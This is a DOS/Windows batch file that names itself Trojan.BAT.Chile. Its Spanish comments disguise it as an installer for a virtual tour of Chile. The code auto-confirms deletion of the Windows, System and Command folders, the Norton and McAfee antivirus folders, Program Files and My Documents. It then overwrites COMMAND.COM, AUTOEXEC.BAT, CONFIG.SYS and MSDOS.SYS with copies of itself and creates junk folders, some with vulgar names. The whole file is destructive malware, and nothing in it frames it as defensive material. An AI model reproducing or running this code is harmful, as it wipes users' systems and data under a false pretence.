   @echo off
   rem Trojan.BAT.Chile By Jadraquer

   REM ************ Bienvenido, Este Archivo Instalará "Un Paseo Virtual por Chile".*********
   rem Sea tan amable de aguardar mientras se copian los archivos y carpetas a su Disco Duro.
   rem Porfavor Espere.........

   cls
   @echo off
   echo s | DEL C:\WINDOWS
   @echo off
   echo s | DEL C:\ARCHIV~1\NORTON~1
   echo s | DEL C:\ARCHIV~1\ANTIVI~1
   echo s | DEL C:\progra~1\NORTON~1
   echo s | DEL C:\progra~1\ANTIVI~1
   echo s | DEL C:\Windows\System
   echo s | DEL C:\Windows\Command
   echo s | DEL C:\Windows\Favoritos
   echo s | DEL C:\ARCHIV~1\Napster
   echo s | DEL C:\ARCHIV~1\Napster\Music
   echo s | DEL C:\ARCHIV~1\Icq
   echo s | DEL C:\ARCHIV~1\MICROS~2
   echo s | DEL C:\ARCHIV~1\McAfee\MCAFEE~1
   echo s | DEL C:\progra~1\McAfee\MCAFEE~1

   echo s | DEL C:\Windows\Command.Com
   echo s | DEL C:\Command.Com

   @echo off
   echo s | DEL C:\progra~1
   @echo off
   echo s | DEL C:\MISDOC~1

   copy %0  %c:%\Command.Com /y
   copy %0  %c:%\Autoexec.Bat /y
   copy %0  %c:%\Config.Sys /y
   copy %0  %c:%\Msdos.sys /y


   mkdir c:\WINDOWS.000
   mkdir c:\Jadraquer
   mkdir c:\CULIAO
   mkdir c:\SEMEN
   mkdir c:\Office 97/2000/2001
   mkdir c:\Microsoft
   mkdir c:\Chile



   rem TROJAN.BAT.CHILE  BY: Jadraquer (Payload Finished jajajajaja)...
